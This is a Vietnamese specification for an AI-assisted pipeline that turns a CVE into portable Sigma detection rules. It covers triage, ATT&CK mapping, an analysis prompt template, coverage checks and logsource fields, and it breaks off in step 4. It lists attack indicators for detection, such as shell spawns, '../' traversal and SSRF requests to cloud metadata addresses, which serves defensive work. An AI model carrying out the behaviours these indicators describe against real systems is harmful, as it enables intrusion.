---
type: specification
status: active
date: 2026-06-05
scope: vendor-agnostic / community
base: CVE-2-Sigma Runbook (https://github.com/.../CVE-2-Sigma.md)
tags:
  - threat-intelligence
  - detection-engineering
  - sigma
  - cve
  - ai-assisted
  - community
  - open-source
---

# Quy Trình Chi Tiết: Từ CVE Đến Sigma Rule (AI-Enhanced, Vendor-Agnostic)

> [!NOTE] Tài liệu này là gì
> Quy trình **6 bước, chi tiết end-to-end** để biến **một CVE** thành **một (hoặc nhiều) Sigma rule** đạt chuẩn, **vendor-agnostic** — viết một lần, để bất kỳ ai cũng convert được sang SIEM của họ (Splunk/Elastic/Sentinel/QRadar…).
> - **Đối tượng**: Detection Engineer, threat researcher.
> - **Đầu vào**: một CVE (mã định danh + advisory). **Đầu ra**: Sigma rule đã ước lượng noise/complexity, sẵn sàng phát hành.
> - **Base tuyệt đối**: tài liệu [`CVE-2-Sigma.md`](../../Users/ADMIN/Downloads/Telegram%20Desktop/CVE-2-Sigma.md) — file này **bám sát cấu trúc 14 section** của nó, **bỏ Bước 5 (Lab) + Bước 8 (Validate/Convert)**, thay hard-coded if-else bằng AI ở Bước 2/4/6/7.
> - **Prerequisite**: `sigma-cli` (xem [§12](#12-tooling-reference)), hiểu Sysmon & log nguồn, có khả năng query portfolio rule hiện tại (SigmaHQ + nội bộ), và `ANTHROPIC_API_KEY` cho các bước AI.

> [!IMPORTANT] Hai nguyên tắc quán xuyến cả quy trình
> 1. **Bạn không phát hiện CVE — bạn phát hiện *hành vi khai thác* hoặc *hậu quả* của nó.** CVE chỉ là mô tả lỗ hổng; cái sinh ra log là *hành động khai thác* và *tác động*. Chuỗi tư duy: `CVE → CWE/TTP (ATT&CK) → telemetry → Sigma rule → (consumer) convert`.
> 2. **Portability là tiêu chí chất lượng.** Viết theo **Sigma taxonomy chuẩn**, KHÔNG khoá field của bất kỳ SIEM nào (ECS/SPL/KQL). Việc map field sang SIEM cụ thể là của *pipeline lúc convert*, không nhồi vào rule.

> [!TIP] Thay đổi so với `CVE-2-Sigma.md`
> Giữ nguyên 14 section (frontmatter, 2 nguyên tắc, tip thay đổi, §1–§13, ghi chú cuối) — nhưng:
> - **Bước 5 (Lab & data)**: bỏ — chuyển sang dùng public dataset ([EVTX-ATTACK-SAMPLES](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES), [Splunk BOTS](https://github.com/splunk/botsv3), [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team), [Vulhub](https://github.com/vulhub/vulhub)) cho smoke-test; nếu không có dataset thì đánh dấu `low-confidence` ở description.
> - **Bước 8 (Validate & convert)**: bỏ khỏi quy trình lõi — chuyển sang pre-commit hook / CI (ngoài scope spec này).
> - **Bước 2, 4, 6, 7**: thay **hard-coded if-else** (vd `BEHAVIOR_ATTACK_GRAPH` trong `app/analysis/attack_mapper.py`, `axis_map` trong `app/telemetry/telemetry_selector.py`, `DetectionTemplate` trong `app/sigma_generator/family_detection/`) bằng **AI inference**. Mỗi bước AI có **fallback** về code hiện tại khi AI fail/timeout/rate-limit.
> - **Bước 1 (Triage)** và **Bước 3 (Coverage)**: giữ rule-based / similarity engine — không cần AI.

---

## 1. Tổng Quan & Pipeline 6 Bước

```text
┌─────────┐  ┌──────────┐  ┌──────────┐  ┌────────────┐  ┌──────────┐  ┌──────────┐
│1.Triage │─▶│2.Analysis│─▶│3.Coverage│─▶│4.Telemetry │─▶│6.Write   │─▶│7.Noise + │
│  CVE    │  │ + ATT&CK │  │  / Gap   │  │ + logsource│  │  Rule    │  │Complexity│
└─────────┘  └────┬─────┘  └────┬─────┘  └──────┬─────┘  └─────┬────┘ └─────┬────┘
              AI  │           rule-based       AI │          AI │         AI │
                  └─────────────┘              └────────────┘ └────────────┘
                  (Bước 5 Lab                (Bước 8 Validate
                   & Bước 8 Validate          đã bỏ — chuyển
                   đã bỏ)                     sang CI)
```

| Bước | Câu hỏi cần trả lời | Output cụ thể | Engine |
|---|---|---|---|
| **1. Triage** | CVE này *là gì*, *đáng* làm rule không? | `TriageContext` + bản ghi triage + quyết định GO/NO-GO | Rule-based (NVD/KEV/EPSS/clients hiện tại) |
| **2. Phân tích + ATT&CK** | Khai thác *hoạt động ra sao*? Quy về *hành vi* nào? | `TechnicalAnalysis` + `AttackMapping` + danh sách TTP | **AI** (fallback: `analyze_behavior()` + `map_attack()`) |
| **3. Coverage/Gap Analysis** | Đã có rule nào bao trùm chưa? Tạo mới hay mở rộng? | `CoverageAssessment` + quyết định NEW/EXTEND/SUPERSEDE + `related` | Rule-based similarity (`sigma_searcher.py`) |
| **4. Telemetry + logsource** | Hành vi để lại *dấu vết gì*, ở *logsource Sigma nào*? | `TelemetryAssessment` | **AI** (fallback: `select_detection_axis()`) |
| **6. Viết rule** | Diễn đạt logic bằng Sigma thế nào cho chuẩn & portable? | `SigmaRule` (YAML) | **AI** (fallback: `DetectionTemplateBuilder`) |
| **7. Noise + complexity** | Bao nhiêu alert/ngày? Truy vấn có quá nặng? | `NoiseEstimate` + `level` đã hiệu chỉnh | **AI** (fallback: `conservative_estimate()`) |

> [!NOTE] Tại sao "Bước 5" và "Bước 6" trong pipeline này khác số thứ tự CVE-2-Sigma?
> Trong `CVE-2-Sigma.md` gốc, Bước 5 = Lab & data và Bước 8 = Validate & convert. Spec này **bỏ** 2 bước đó nhưng **giữ nguyên số thứ tự** của các bước còn lại (2, 3, 4, 6, 7) để mọi cross-reference (file, log, comment) trong codebase không bị xé. Pipeline hiển thị ở trên là thứ tự thực thi, **không phải** đánh số lại.

---

## 2. Bước 1 — Triage & Tiếp Nhận CVE

**Mục tiêu**: hiểu nhanh CVE và quyết định *có đầu tư viết rule không*. Không có bước này, bạn dễ phí công cho CVE không khả thi phát hiện.

> [!NOTE] Bước 1 **không dùng AI** — vẫn chạy rule-based qua các provider hiện có (`app/providers/nvd`, `app/providers/kev`, `app/providers/epss`, `app/triage/stages/*`). AI chỉ vào cuộc từ Bước 2.

### 2.1. Nguồn thông tin & cái cần trích từ mỗi nguồn

| Nguồn | Trích cái gì | Code hiện tại |
|---|---|---|
| **NVD** (`nvd.nist.gov/vuln/detail/<CVE>`) | Mô tả, **CVSS vector**, **CPE** (sản phẩm + dải phiên bản ảnh hưởng), **CWE**, danh sách references | `app/providers/nvd/provider.py` + `app/clients/nvd_client.py` |
| **MITRE CVE** (`cve.org/CVERecord?id=<CVE>`) | Bản ghi gốc, references của nhà cung cấp | `app/providers/nvd/parser.py` |
| **CISA KEV** (`cisa.gov/known-exploited-vulnerabilities-catalog`) | CVE *đang bị khai thác thực tế*: ngày thêm, hạn vá, có dùng trong ransomware không | `app/providers/kev/provider.py` + `app/providers/kev/parser.py` |
| **VulnCheck KEV** (`vulncheck.com/kev`) | Bổ sung CISA KEV — thường rộng hơn, cập nhật nhanh hơn | (provider chưa có — dùng CISA KEV làm chính) |
| **EPSS** (`first.org/epss`) | Xác suất bị khai thác trong 30 ngày tới (0–1) + percentile | `app/providers/epss/provider.py` + `app/clients/epss_client.py` |
| **Vendor advisory** | Cơ chế kỹ thuật, bản vá, IOC chính thức, phiên bản fix | (parse từ `references` của NVD — `app/parsers/reference_parser.py`) |
| **Exploit-DB / GitHub / Metasploit** | PoC: mức độ "vũ khí hoá", payload mẫu | (heuristic từ URL `references` chứa `exploit`/`poc`/`github.com`) |
| **Threat-actor feed** (MS-ISAC, Mandiant, OTX) | Ai đang khai thác | (chưa integrate — để trống `threat_actors` trong `TriageContext`) |
| **Shodan / Censys** | Số instance lộ Internet | (chưa integrate — để trống `internet_exposure`) |

### 2.2. Output Bước 1 — schema model (verbatim từ code)

**File**: `app/models/triage.py::TriageContext`

```python
class TriageContext(BaseModel):
    in_kev: bool | None = None
    kev_added_date: datetime | None = None
    ransomware_usage: bool = False
    epss_score: float | None = None
    epss_percentile: float | None = None
    internet_exposure: int | None = None
    public_poc: bool = False
    poc_references: List[str] | None = None
    threat_actors: List[str] | None = None
    observed_in_the_wild: bool = False
    capability_assessment: str | None = None
    priority: str | None = None
    priority_score: int | None = None
    decision: str | None = None      # "GO" | "NO-GO"
    rationale: str | None = None
    extensions: dict[str, object] | None = Field(default=None, description="Reserved for Phase 2")
```

**File**: `app/models/core.py::CoreCVEData` — input cho Bước 2

```python
class CoreCVEData(BaseModel):
    cve_id: str
    description: str | None = None
    cvss_score: float | None = None
    cvss_vector: str | None = None
    severity: str | None = None
    cwe_ids: List[str] | None = None
    references: List[str] | None = None
    cpes: List[str] | None = None
    affected_products: List[str] | None = Field(default=None, description="Reserved for Phase 2")
    published_at: datetime | None = None
    modified_at: datetime | None = None
```

### 2.3. Đọc CVSS vector (để biết bề mặt tấn công)

CVSS không chỉ là một con số — **vector** mới cho biết khai thác xảy ra ở đâu:

| Trường | Giá trị | Ý nghĩa cho việc phát hiện |
|---|---|---|
| **AV** (Attack Vector) | `N` Network / `A` Adjacent / `L` Local / `P` Physical | `N` ⇒ khai thác từ xa, dấu vết thường ở network/web log |
| **AC** (Attack Complexity) | `L` Low / `H` High | `L` ⇒ dễ khai thác hàng loạt → ưu tiên |
| **PR** (Privileges Required) | `N` None / `L` / `H` | `N` ⇒ không cần tài khoản (tiền-xác thực) |
| **UI** (User Interaction) | `N` None / `R` Required | `N` ⇒ không cần dụ người dùng (wormable) |
| **S** (Scope) | `U` Unchanged / `C` Changed | `C` ⇒ ảnh hưởng vượt phạm vi component bị lỗi |
| **C/I/A** (Impact) | `N` / `L` / `H` | mức tác động bảo mật/toàn vẩn/sẵn sàng |

> Ví dụ `AV:N/AC:L/PR:N/UI:N` = khai thác từ xa, đơn giản, không cần quyền, không cần tương tác → cực nguy hiểm, dấu vết tiền-khai thác thường nằm ở **request mạng**.

### 2.4. Ma trận ưu tiên

| Tín hiệu | Mức ưu tiên |
|---|---|
| Có trong **CISA KEV** | Cao nhất — đang bị khai thác |
| **EPSS** > 0.5 | Cao — khả năng khai thác lớn |
| **CVSS** ≥ 9.0 + `AV:N`/`PR:N` (RCE tiền-auth) | Cao — tác động + bề mặt lớn |
| PoC công khai / module Metasploit | Trung-cao — dễ tái lập để viết & test rule |
| Phần mềm phổ biến, expose Internet (Shodan/Censys > 10k instance) | Cao — độ phủ rộng |
| Threat actor cụ thể đang khai thác | Cao — context cho TTP focus |

### 2.5. Capability check (skip CVE ngoài khả năng)

Trước khi quyết định GO, kiểm tra CVE có *quan sát được* không. NO-GO ngay nếu:
- Hardware/firmware bug không có software telemetry path
- Proprietary network appliance không export log
- Pure cryptographic weakness (không có hành vi quan sát được)
- Information disclosure không kéo theo follow-on action

`Capability` enum hiện tại: `app/types/capability.py` — giá trị `in_scope` / `out_of_scope_*`.

### 2.6. Bản ghi triage (template — luôn ghi lại)

```text
CVE:             CVE-XXXX-YYYYY
Sản phẩm/ver:    <từ CPE>
CVSS:            <điểm> (<vector>)
CWE:             CWE-XXX (<loại>)
KEV / EPSS:      <có/không> / <xác suất>
Exposure:        <số instance Shodan/Censys nếu có>
Threat actor:    <nếu có>
PoC:             <link permalink>
Capability:      in_scope / out_of_scope_firmware / out_of_scope_proprietary / out_of_scope_other
Quyết định:      GO / NO-GO
Lý do:           <vì sao>
```

---

## 3. Bước 2 — Phân Tích Kỹ Thuật + Map ATT&CK (AI)

**Mục tiêu**: hiểu *khai thác làm gì* và quy về *hành vi (TTP)* — đây là cầu nối quyết định bạn sẽ tìm dấu vết ở đâu (Bước 4).

> [!IMPORTANT] Bước 2 dùng **AI làm primary**, fallback về rule-based.
> Thay vì tra cứu `BEHAVIOR_ATTACK_GRAPH` + `VULNERABILITY_CLASS_ATTACK_GRAPH` trong `app/analysis/attack_mapper.py` (hard-coded 9 behavior + 11 class), AI suy luận từ description + CWE + CVSS + references. Khi AI fail/timeout, gọi lại đúng code hiện tại (`analyze_behavior()` + `map_attack()`).

### 3.1. Hiểu cơ chế khai thác

Trả lời 3 câu hỏi (AI phải trả lời rõ trong output `reasoning[]`):
- **(a) Vector vào**: input đi vào qua đâu? (HTTP request? file upload? deserialize? tham số dòng lệnh?)
- **(b) Hành vi sau khi vào**: khai thác *làm gì*? (spawn process? ghi file? kết nối ra ngoài? đọc file nhạy cảm?)
- **(c) Cái gì *bắt buộc* xảy ra** (khó né) so với cái *tuỳ biến được* (dễ né)?

### 3.2. CWE → loại dấu vết (bản đồ định hướng telemetry)

> Bảng này **đưa nguyên vào prompt** làm reference cho AI.

| CWE | Loại lỗ hổng | Dấu vết điển hình | logsource gợi ý |
|---|---|---|---|
| **CWE-502** | Deserialization | Process con bất thường, kết nối egress | `process_creation`, `network_connection` |
| **CWE-78** | OS Command Injection | App spawn shell (`cmd`/`bash`/`sh`) | `process_creation` |
| **CWE-89** | SQL Injection | Pattern SQL trong request, lỗi DB, auth bypass | `webserver`, application log |
| **CWE-22** | Path Traversal | `../` trong URI, đọc file ngoài webroot | `webserver`, `file_event` |
| **CWE-434** | Unrestricted Upload | File thực thi ghi vào webroot (webshell) | `file_event`, `webserver` |
| **CWE-918** | SSRF | Outbound request tới nội bộ / `169.254.169.254` | `network_connection`, proxy |
| **CWE-287 / CWE-306** | Auth bypass / thiếu auth | Truy cập endpoint nhạy cảm không cần đăng nhập | `webserver`, authentication |
| **CWE-917 / CWE-94** | Expression / Code Injection | Thực thi mã, process con, egress | `process_creation`, `network_connection` |

### 3.3. Mổ xẻ PoC

Khi có PoC, tách ra 3 phần:
1. **Trigger / input**: chính xác chuỗi/payload gửi đi (sẽ thành selection của trục pre-exploit).
2. **Precondition**: điều kiện để khai thác chạy (phiên bản, cấu hình) — quyết định CVE có liên quan không.
3. **Side-effect quan sát được**: cái xảy ra trên hệ thống nạn nhân (sẽ thành selection của trục post-exploit/impact).

> [!TIP] Ưu tiên indicator "khó né"
> Một payload chuỗi literal **dễ né** bằng obfuscation/encoding. Một *hành vi bắt buộc* (process spawn, kết nối ra ngoài, file ghi xuống) thì **khó né** hơn nhiều. Rule dựa trên hành vi bền hơn rule dựa trên signature payload.

### 3.4. Map MITRE ATT&CK (AI suy luận + tham chiếu bảng)

> AI được cung cấp bảng mapping dưới đây làm "prior" — nhưng được phép suy luận ra ngoài bảng nếu có lý do rõ ràng trong `reasoning[]`.

| Hành vi | Tactic | Technique |
|---|---|---|
| Khai thác dịch vụ public | Initial Access | `T1190` Exploit Public-Facing Application |
| Thực thi lệnh/script | Execution | `T1059` (`.001` PowerShell, `.003` cmd, `.004` Unix shell) |
| Cài webshell | Persistence | `T1505.003` Web Shell |
| Tải công cụ về | Command & Control | `T1105` Ingress Tool Transfer |
| Beacon/C2 tầng ứng dụng | Command & Control | `T1071` Application Layer Protocol |
| Leo thang qua khai thác | Privilege Escalation | `T1068` Exploitation for Privilege Escalation |
| Compromise supply chain | Initial Access | `T1195` (`.001`/`.002`/`.003`) |
| Compromise software dependencies | Persistence | `T1554` Compromise Host Software Binary |

### 3.5. AI Prompt (system + user) — verbatim đặt trong `app/services/ai/prompts/analyze_behavior.txt`

**System prompt:**

```text
You are a security researcher specializing in vulnerability analysis and detection engineering.
Analyze CVEs and produce a structured technical analysis + MITRE ATT&CK mapping.

Principles:
1. Focus on OBSERVABLE BEHAVIORS during exploitation, not theoretical risk.
2. Identify MANDATORY behaviors (hard to evade) — these drive the detection.
3. Distinguish OPTIONAL/EVASIVE behaviors (easy to bypass) — note but do not over-rely.
4. Use Sigma taxonomy + MITRE ATT&CK correctly. Only emit technique IDs that exist in ATT&CK.
5. If CWE references behavior outside this table, infer conservatively and explain in reasoning.

## Reference — CWE → telemetry hint
{CWE_TABLE_FROM_3.2}

## Reference — behavior → ATT&CK prior
{ATTACK_TABLE_FROM_3.4}

## Hard constraint
Emit ONLY technique IDs that appear in the reference table or are well-known ATT&CK IDs.
If unsure, omit and note in reasoning[].
```

**User prompt:**

```text
Analyze this CVE for detection engineering:

**CVE ID**: {cve_id}
**Description**: {description}
**CVSS**: {cvss_score} ({cvss_vector})
**CWE IDs**: {cwe_ids}
**CPEs**: {cpes}
**References**: {references}
**Published**: {published_at}
**Modified**: {modified_at}

Return a JSON object with EXACTLY these keys:
{
  "vulnerability_class": "DESERIALIZATION|COMMAND_INJECTION|PATH_TRAVERSAL|FILE_UPLOAD|SSRF|AUTH_BYPASS|PRIVILEGE_ESCALATION|CODE_INJECTION|WEBSHELL_DROP|INFORMATION_DISCLOSURE|REMOTE_CODE_EXECUTION|SQL_INJECTION|UNKNOWN",
  "vulnerability_type": "<one-line description>",
  "mandatory_behaviors": ["process_creation", "network_callback", ...],
  "optional_behaviors": ["file_write", ...],
  "evasive_indicators": ["obfuscation", "encoding", ...],
  "exploit_requirements": ["reachable_service", "public_exploit_artifact", ...],
  "tactics": ["TA0001", "TA0002", ...],
  "techniques": ["T1190", "T1059", ...],
  "subtechniques": ["T1059.004", ...],
  "attack_flow": {
    "entry_vector": "http_request|file_upload|deserialize|cli_arg|...",
    "execution_mechanism": "...",
    "observable_side_effects": ["..."]
  },
  "family": "log4shell|spring4shell|printnightmare|...|unknown",
  "signature": "<known signature name from internal signature DB, or null>",
  "pre_auth": true|false,
  "remote_exploitable": true|false,
  "exploit_complexity": "low|high",
  "likely_outcome": "remote_code_execution|privilege_escalation|information_disclosure|webshell_persistence|unauthenticated_remote_compromise|limited_impact",
  "confidence": 0.0-1.0,
  "reasoning": ["reason1", "reason2", ...]
}
```

### 3.6. Output Bước 2 — schema model (verbatim từ code)

**File**: `app/models/attack.py`

```python
class CWEMetadata(BaseModel):
    cwe_id: str | None = None
    cwe_name: str | None = None
    mapping_confidence: float | None = None


class AttackFlow(BaseModel):
    entry_vector: str | None = None
    execution_mechanism: str | None = None
    observable_side_effects: list[str] | None = None


class TechnicalAnalysis(BaseModel):
    family: str | None = None
    signature: str | None = None
    extracted_keywords: list[str] | None = None
    vulnerability_type: str | None = None
    vulnerability_class: VulnerabilityClass | None = None
    exploit_vector: str | None = None
    pre_auth: bool | None = None
    remote_exploitable: bool | None = None
    exploit_complexity: str | None = None
    confidence: float | None = None
    cwe_metadata: CWEMetadata | None = None
    attack_flow: AttackFlow | None = None
    likely_outcome: str | None = None
    mandatory_behaviors: list[str] | None = None
    evasive_indicators: list[str] | None = None
    exploit_requirements: list[str] | None = None
    reasoning: list[str] | None = None
    analysis_confidence: float | None = None
    classification_reason: list[str] | None = None
    behavior_reason: list[str] | None = None


class AttackMapping(BaseModel):
    tactics: list[str] | None = None
    techniques: list[str] | None = None
    subtechniques: list[str] | None = None
    confidence: float | None = None
    mapping_reasons: list[str] | None = None
    attack_mapping_confidence: float | None = None
```

> [!NOTE] Enum `VulnerabilityClass` định nghĩa ở `app/types/vulnerability_class.py`. AI phải emit đúng một trong các giá trị này — nếu không match, fallback parser sẽ raise và chuyển sang `UNKNOWN`.

### 3.7. Nguồn dữ liệu để AI so sánh / sàng lọc

| # | Nguồn | Cách dùng trong prompt |
|---|---|---|
| 1 | `app/analysis/attack_mapper.py::BEHAVIOR_ATTACK_GRAPH` (9 behavior → TTP) | Đưa nguyên dict vào system prompt làm "prior" |
| 2 | `app/analysis/attack_mapper.py::VULNERABILITY_CLASS_ATTACK_GRAPH` (11 class → TTP) | Đưa nguyên dict vào system prompt làm "prior" |
| 3 | Bảng CWE→dấu vết (mục 3.2 ở trên) | Embed trong system prompt |
| 4 | Bảng hành vi→TTP (mục 3.4 ở trên) | Embed trong system prompt |
| 5 | MITRE ATT&CK STIX 2.1 bundle (`enterprise-attack.json`) | Filter lấy technique ID hợp lệ, validate output AI trước khi merge |
| 6 | Internal signature DB (`app/analysis/vulnerability_signature_engine.py`) | Nếu `signature` match → dùng kết quả signature, bỏ qua AI |
| 7 | Family classifier (`app/analysis/family_classifier.py`) | Nếu family known (vd `spring4shell`) → override outcome |

### 3.8. Fallback (khi AI fail / parse lỗi / timeout)

| Hàm | File | Trả về |
|---|---|---|
| `analyze_behavior()` | `app/analysis/behavior_analyzer.py` | dict có đầy đủ keys cho `TechnicalAnalysis` |
| `map_attack()` | `app/analysis/attack_mapper.py` | dict có đầy đủ keys cho `AttackMapping` |
| `infer_exploit_ontology()` | `app/analysis/exploit_ontology.py` | `ExploitOntologyResult` — base behaviors |
| `match_signature()` | `app/analysis/vulnerability_signature_engine.py` | `SignatureMatch | None` — override nếu match |
| `classify_family()` | `app/analysis/family_classifier.py` | `(family, confidence, reasons)` |

Khi fallback chạy, set flag `analysis.ai_used = False`, `analysis.ai_fallback_used = True` — propagation lên `EnrichedCVEContext.metadata`.

### 3.9. Service Interface — `app/services/ai/analyzer.py`

```python
class AIBehaviorAnalyzer:
    def __init__(
        self,
        anthropic_client: Anthropic,
        fallback_analyzer: BehaviorAnalyzer,
        fallback_mapper: AttackMapper,
    ):
        self.client = anthropic_client
        self.fallback_analyzer = fallback_analyzer
        self.fallback_mapper = fallback_mapper

    async def analyze(
        self,
        cve_id: str,
        description: str | None,
        cwe_ids: list[str] | None,
        cvss_vector: str | None,
        cvss_score: float | None,
        references: list[str] | None,
        cpes: list[str] | None,
        published_at: datetime | None,
        modified_at: datetime | None,
    ) -> tuple[TechnicalAnalysis, AttackMapping]:
        try:
            return await self._ai_analyze(...)
        except (AIServiceError, ValidationError, json.JSONDecodeError):
            logger.warning("AI analyze failed, using rule-based fallback", extra={"cve_id": cve_id})
            return self._fallback_analyze(...)
```

### 3.10. Output Bước 2 (tóm tắt)

- Bảng tóm lược `{vector, hành vi bắt buộc vs dễ né, CWE, danh sách TTP}` (cho human reader).
- `TechnicalAnalysis` instance (cho pipeline nội bộ).
- `AttackMapping` instance (cho Bước 3 & Bước 4).

---

## 4. Bước 3 — Coverage/Gap Analysis

**Mục tiêu**: trước khi viết rule mới, biết *đã có rule nào bao trùm hành vi này chưa*. Tránh nhân bản rule, biết khi nào nên *mở rộng* rule cũ thay vì tạo mới, và biết khi nào rule mới phải khai báo `related` về rule cũ.

> [!NOTE] Bước 3 **không dùng AI** — vẫn chạy rule-based similarity qua `app/coverage/*`. Nếu sau này muốn thêm AI ở đây, refactor sang dùng semantic embedding (BM25 + dense) là đủ, không cần thay đổi spec này.

> [!IMPORTANT] Tại sao bỏ bước này là sai lầm chiến lược
> - **Duplicate alert**: 2 rule cùng fire trên cùng event → SOC nhận double alert, signal/noise giảm.
> - **Drift theo thời gian**: rule cũ + rule mới đều "đúng" lúc viết, nhưng sửa rule cũ không lan tới rule mới → behaviour rẽ nhánh, khó debug.
> - **Vỡ tracking `related`**: nếu rule mới thực sự *làm rule cũ lỗi thời* (`obsolete`) nhưng không khai báo, user pin rule cũ sẽ bị bỏ rơi.

### 4.1. Hai trục tra cứu

Tra cứu rule sẵn có theo **hai trục độc lập**, hợp kết quả:

1. **Theo CVE id** — `cve.YYYY.NNNN` tag:
   ```bash
   # SigmaHQ public repo
   rg -l "^\s*- cve\.2021\.44228" rules/ rules-emerging-threats/ rules-threat-hunting/
   # Internal repo
   rg -l "^\s*- cve\.2021\.44228" internal-sigma/
   ```
   Code: `app/coverage/sigma_searcher.py::search_by_cve_id()`

2. **Theo TTP + logsource** — `attack.t####` + `logsource.category`:
   ```bash
   yq '. | select(.tags[] | contains("attack.t1190")) | select(.logsource.category == "webserver") | .id + " " + .title' rules/**/*.yml
   ```
   Code: `app/coverage/sigma_searcher.py::search_by_ttp_and_logsource()`

Trục 1 bắt rule đã liệt kê chính xác CVE này; trục 2 bắt rule *hành vi tương tự* nhưng cho CVE khác (rất phổ biến — vd nhiều rule "java spawns cmd" trùng nguyên lý nhưng khác CVE).

### 4.2. Quyết định NEW / EXTEND / SUPERSEDE

Sau khi có danh sách rule liên quan, dùng ma trận sau (`app/coverage/decision_engine.py`):

| Tình huống | Quyết định | `related.type` |
|---|---|---|
| Không có rule nào cover hành vi này | **NEW** (id mới, không khai related) | — |
| Có rule cover *cùng hành vi* nhưng *thiếu CVE id* trong tag | **EXTEND** rule cũ (giữ id, bump `modified`, thêm `cve.YYYY.NNNN` vào tags) | — (sửa tại chỗ) |
| Có rule cover *gần giống* (cùng TTP + logsource) nhưng *selection khác* hợp lý cho CVE này | **NEW** với `related.type: similar` trỏ về rule cũ | `similar` |
| Rule cũ *kém hơn hẳn* (signature payload mong manh) — rule mới thay thế | **NEW** với `related.type: obsolete` trỏ về rule cũ; rule cũ chuyển `status: deprecated` | `obsolete` |
| Rule mới *hợp nhất* 2-3 rule cũ chồng chéo | **NEW** với `related.type: merged` (liệt kê nhiều id) | `merged` |
| Rule mới *dẫn xuất từ* rule cũ (mở rộng phạm vi mà không thay thế) | **NEW** với `related.type: derived` | `derived` |

> [!WARNING] Quy tắc đổi `id` vs giữ `id` (gặp liên tục — sai = vỡ tracking)
> - **Thay đổi *semantic* (logic/scope khác đi)** → tạo **`id` MỚI** + khai báo `related` trỏ về rule cũ.
> - **Chỉ tinh chỉnh filter / FP** (không đổi ý nghĩa) → **GIỮ `id`**, chỉ bump `modified`.

### 4.3. Nguồn portfolio để tra cứu

| Nguồn | Mô tả |
|---|---|
| [SigmaHQ/sigma](https://github.com/SigmaHQ/sigma) | Repo chuẩn ~3000+ rule public — `rules/`, `rules-emerging-threats/`, `rules-threat-hunting/`, `rules-dfir/` |
| [SigmaHQ/Detection-Rule-License](https://github.com/SigmaHQ/Detection-Rule-License) | License DRL 1.1 — nếu fork rule public, attribution bắt buộc |
| Internal Sigma repo | Repo nội bộ của tổ chức — query trước rule public |
| [Uncoder.io](https://uncoder.io) | Có thể search rule cộng đồng theo tag |
| Local index trong code | `app/coverage/sigma_searcher.py` (vector store / BM25 — Phase 2) |

> [!TIP] Tự động hoá coverage check
> Trong CI/agent: index toàn bộ rule public + nội bộ vào Elasticsearch (BM25) + vector store (dense) — query theo `cve.*`, `attack.t*`, `logsource.category`. Sub-second response, không cần grep từng commit.

### 4.4. Output Bước 3 — schema model (verbatim từ code)

**File**: `app/models/coverage.py::CoverageAssessment`

```python
class CoverageAssessment(BaseModel):
    decision: str | None = None                          # "NEW" | "EXTEND" | "SUPERSEDE"
    matched_rule_ids: list[str] | None = None
    matched_titles: list[str] | None = None
    matched_rule_titles: list[str] | None = None
    coverage_score: float | None = None                  # 0-1
    coverage_reasoning: list[str] | None = None
    similarity_reasoning: list[str] | None = None
    related_rules: list[str] | None = None
    related_attack_rules: list[str] | None = None
    overlap_score: float | None = None
    relationship_type: str | None = None
    reasoning: str | None = None
    skipped: bool | None = None
    overlap_breakdown: dict[str, float] | None = None
    decision_reason: str | None = None
```

Cấu trúc `related` block sinh ra từ `CoverageAssessment.related_rules` (Bước 6 sẽ copy vào `SigmaMetadata.related`):

```yaml
related:
  - id: a8f7e6d5-1c2b-4a3e-9f8d-7c6b5a4e3d2c
    type: obsolete        # rule mới này làm rule cũ <id> lỗi thời
  - id: b9c8d7e6-2c3b-4a3e-9f8d-7c6b5a4e3d2c
    type: similar         # rule cũ <id> có ý tưởng tương tự
```

### 4.5. Output Bước 3 (tóm tắt)

- Danh sách rule liên quan đã tìm thấy (id + path + similarity reason).
- Quyết định: NEW / EXTEND / SUPERSEDE.
- Nếu NEW: `related` block đã chuẩn bị sẵn cho Bước 6.
- Nếu EXTEND: rule cũ cần sửa + `modified` date mới.

---

## 5. Bước 4 — Telemetry & Chọn Logsource Chuẩn (AI)

**Mục tiêu**: với mỗi hành vi đã xác định, tìm *dấu vết quan sát được* và ánh xạ tới **logsource Sigma chuẩn**. Đây là bước quyết định rule có khả thi & portable hay không.

> [!IMPORTANT] Bước 4 dùng **AI làm primary**, fallback về `select_detection_axis()` + `axis_map` hard-coded trong `app/telemetry/telemetry_selector.py`.

### 5.1. Ba trục phát hiện

Mỗi CVE thường phát hiện được trên **≥1 trục**. Ưu tiên **post-exploitation** và **impact** vì khó né hơn signature payload.

| Trục | Phát hiện gì | Log nguồn điển hình | Độ bền |
|---|---|---|---|
| **Pre-exploitation** | Signature/IOC của *payload* (chuỗi khai thác trong request) | webserver, proxy, IDS | Thấp — dễ né bằng obfuscation/encoding |
| **Post-exploitation** | *Hành vi sau khai thác* (process con, ghi file, load module) | endpoint (Sysmon/EDR) | Cao — khó tránh việc chạy lệnh |
| **Impact / consequence** | *Hậu quả* (egress bất thường, webshell drop, beacon C2) | network, DNS, file | Cao nhất — nhưng có thể trễ, cần baseline |

### 5.2. Chọn `logsource` chuẩn + field theo taxonomy ĐÚNG logsource đó

> [!WARNING] KHÔNG generalize "Sysmon-style" cho mọi logsource
> Mỗi `category` có bộ field riêng trong [sigma-appendix-taxonomy](https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-appendix-taxonomy.md). `webserver` KHÔNG dùng `Image`; `process_creation` KHÔNG dùng `cs-uri-query`. Dùng sai = rule không convert đúng ở SIEM người dùng.

| `category` | Nguồn (vd Sysmon EID) | Field tiêu biểu |
|---|---|---|
| `process_creation` | Sysmon EID 1 / EDR | `Image`, `CommandLine`, `ParentImage`, `ParentCommandLine`, `User`, `IntegrityLevel`, `CurrentDirectory`, `OriginalFileName` |
| `webserver` | access log (W3C) | `cs-method`, `cs-uri-stem`, `cs-uri-query`, `cs-user-agent`, `cs-referer`, `cs-host`, `sc-status`, `c-ip` |
| `network_connection` | Sysmon EID 3 | `Image`, `DestinationIp`, `DestinationPort`, `DestinationHostname`, `Initiated`, `Protocol` |
| `dns_query` | Sysmon EID 22 | `QueryName`, `QueryStatus`, `QueryResults`, `Image` |
| `file_event` | Sysmon EID 11 | `TargetFilename`, `Image` |
| `registry_set` / `registry_event` | Sysmon EID 13/12 | `TargetObject`, `Details`, `Image` |
| `image_load` | Sysmon EID 7 | `ImageLoaded`, `Image`, `Signed`, `Signature`, `SignatureStatus` |
| `ps_script` | PowerShell EID 4104 | `ScriptBlockText` |
| `firewall` | thiết bị firewall | `src_ip`, `dst_ip`, `dst_port`, `action`, `protocol` |
| `antivirus` | AV log | `Filename`, `Signature` |

